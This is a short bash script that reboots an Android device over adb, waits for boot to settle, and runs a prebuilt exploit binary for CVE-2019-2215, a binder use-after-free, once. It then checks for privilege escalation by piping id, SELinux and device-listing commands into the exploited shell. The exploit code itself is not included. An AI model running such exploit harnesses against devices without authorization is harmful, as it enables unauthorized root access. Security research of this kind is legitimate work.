#!/bin/bash
# Reboot, wait for a settled system, then run the exploit ONCE.
# The UAF needs a clean heap: the first run after a boot succeeds, later ones
# leave the heap fragmented and die right after the addr_limit overwrite
# (zombie processes, no "struct_cred is at:" line).
set -u

echo "############ rebooting the device"
timeout 60 adb reboot 2>&1
sleep 25

echo "############ waiting for adb to come back"
for i in $(seq 1 60); do
  ST=$(timeout 20 adb get-state 2>/dev/null | head -1)
  if [ "$ST" = "device" ]; then echo "  adb up after ${i}0s"; break; fi
  sleep 10
done

timeout 30 adb devices -l 2>&1 | head -3

echo "############ waiting for boot to complete"
for i in $(seq 1 60); do
  BC=$(timeout 20 adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
  if [ "$BC" = "1" ]; then echo "  boot_completed after ${i}0s"; break; fi
  sleep 10
done

echo "############ letting the system settle (heap quiet)"
sleep 60
timeout 30 adb shell 'cat /proc/uptime' 2>&1

echo
echo "############ running the exploit ONCE"
printf 'id\ncat /proc/self/attr/current\ngetenforce\nls -la /dev/nve0 2>&1\n' \
  | timeout 240 adb shell /data/local/tmp/cve-2019-2215 > /tmp/exp_fresh.out 2>&1
echo "lines: $(wc -l < /tmp/exp_fresh.out)"
echo
echo "=========== tail ==========="
tail -20 /tmp/exp_fresh.out
